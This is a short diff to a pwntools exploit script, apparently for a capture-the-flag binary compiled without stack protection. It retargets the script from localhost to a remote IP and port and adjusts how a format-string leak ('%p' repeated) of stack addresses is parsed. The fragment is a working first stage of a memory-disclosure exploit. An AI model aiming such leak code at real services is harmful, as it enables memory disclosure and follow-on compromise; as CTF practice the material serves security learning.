@@ -2,7 +2,8 @@ from pwn import *
 
 #  Compile using: gcc -o pwn4 pwn4 -fno-stack-protector -no-pie
 
-p = remote('127.0.0.1', 1024)
+# p = remote('127.0.0.1', 1024)
+p = remote("3.142.26.175", 1337)
 # p = process("./real_hack")
 
 context.arch = 'amd64'
@@ -14,7 +15,9 @@ format_string = '%p '*15
 
 p.sendline(format_string)
 
-addr_on_stack = p.recvuntil("Where is the flag anyway?").split(b"\n")[1].split()[-2]
+resp = p.recvuntil("Where is the flag anyway?")
+
+addr_on_stack = resp.split(b"\n")[2].split()[-2]    # [2] if server, [1] locally
 
 print(addr_on_stack)
 
